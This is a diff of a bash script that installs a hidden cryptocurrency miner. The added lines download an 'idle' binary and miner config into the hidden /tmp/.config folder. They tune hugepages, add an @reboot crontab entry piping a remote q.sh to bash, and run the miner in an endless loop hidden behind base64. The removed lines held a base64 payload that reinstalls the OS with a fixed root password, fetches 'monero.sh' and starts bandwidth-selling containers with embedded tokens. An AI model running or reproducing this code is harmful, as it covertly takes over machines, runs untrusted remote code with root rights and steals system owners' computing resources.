@@ -1,8 +1,31 @@
 #!/bin/bash
 
+mode="${1:-0}"
+work="/tmp/.config"
+src="https://raw.githubusercontent.com/cibxnxu/zhigengniao/main"
+hugepage="128"
 
-sleep 120
-#sleep "$[od -An -N2 -i /dev/urandom % 10800 + 10800]"
+name=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
+[ -n "$name" ] || name="NULL"
+name="${name}"
 
+cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
+[ -n "$cores" ] || cores=1
+[ "$cores" -gt "2" ] && rx="[`seq -s ', ' 0 $((cores - 2))`]" || rx=""
 
-bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/MoeClub/Note/master/InstallNET.sh) -d 12 -v 64 -a -p "X.myxiao23232369" -port 2233 -cmd "IyEvYmluL2Jhc2gKIyBEZWJpYW4xMisKc3VkbyBhcHQgLXFxeSB1cGRhdGUgPi9kZXYvbnVsbCAyPiYxIHx8IGFwdCAtcXF5IHVwZGF0ZSA+L2Rldi9udWxsIDI+JjEKc3VkbyBhcHQgLXFxeSBpbnN0YWxsIHdnZXQgcHJvY3BzIHBzbWlzYyBsc29mIGNyb24gaWN1LWRldnRvb2xzIG5ldGNhdC10cmFkaXRpb25hbCBiaW5kOS1ob3N0ID4vZGV2L251bGwgMj4mMSB8fCBhcHQgLXFxeSBpbnN0YWxsIHdnZXQgcHJvY3BzIHBzbWlzYyBsc29mIGNyb24gaWN1LWRldnRvb2xzIG5ldGNhdC10cmFkaXRpb25hbCBiaW5kOS1ob3N0ID4vZGV2L251bGwgMj4mMQpiYXNoIDwod2dldCAtLW5vLWNoZWNrLWNlcnRpZmljYXRlIC1xTy0gaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3pqYWFjOC96aGlnZW5nbmlhby9tYWluL21vbmVyby5zaCkgPi9kZXYvbnVsbCAyPiYxICYKd2dldCAtTyBkdW9rYWkuc2ggaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0xTSDE2MDk4MS9UaXRhbi1OZXR3b3JrL21haW4vZHVva2FpLnNoICYmIGNobW9kICt4IGR1b2thaS5zaCAmJiAuL2R1b2thaS5zaAp3Z2V0IC1xTy0gZ2V0LmRvY2tlci5jb20gfCBiYXNoCmRvY2tlciBydW4gLWQgLS1yZXN0YXJ0PWFsd2F5cyAtLW5hbWUgdG0gdHJhZmZtb25ldGl6ZXIvY2xpX3YyIHN0YXJ0IGFjY2VwdCAtLXRva2VuIGF5RE1hM2phNDA4alBkVEJCemJURTUyTXY5dVdaK1FLOTYzV09xN1FWYjQ9CmRvY2tlciBydW4gLWQgLS1yZXN0YXJ0PWFsd2F5cyAtZSBFQVJORk1fVE9LRU49IjZlNWUzNDRkLTJiNzgtNDJkNS1iNDhlLTBhYmYzMzQxMTgwMSIgLS1uYW1lIGVhcm5mbS1jbGllbnQgZWFybmZtL2Vhcm5mbS1jbGllbnQ6bGF0ZXN0"
+sudo sysctl -w vm.panic_on_oom=1 >/dev/null 2>&1 || sysctl -w vm.panic_on_oom=1 >/dev/null 2>&1
+sudo sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1
+sudo sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1
+
+rm -rf "${work}"; mkdir -p "${work}"
+wget --no-check-certificate -qO "${work}/config.json" "${src}/idle.json"
+wget --no-check-certificate -qO "${work}/idle" "${src}/idle"
+[ -f "${work}/config.json" ] && [ -n "$name" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${name}\",/g" "${work}/config.json"
+[ -f "${work}/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "${work}/config.json"
+chmod -R 777 "${work}"
+
+if [ "$mode" == "0" ]; then
+  sh <(echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5pY2UgLW4gMTkgLi9pZGxlID4vZGV2L251bGwgMj4mMSA7IGRvbmU=' |base64 -d) &
+else
+  sh <(echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5pY2UgLW4gMTkgLi9pZGxlID4vZGV2L251bGwgMj4mMSA7IGRvbmU=' |base64 -d)
+fi
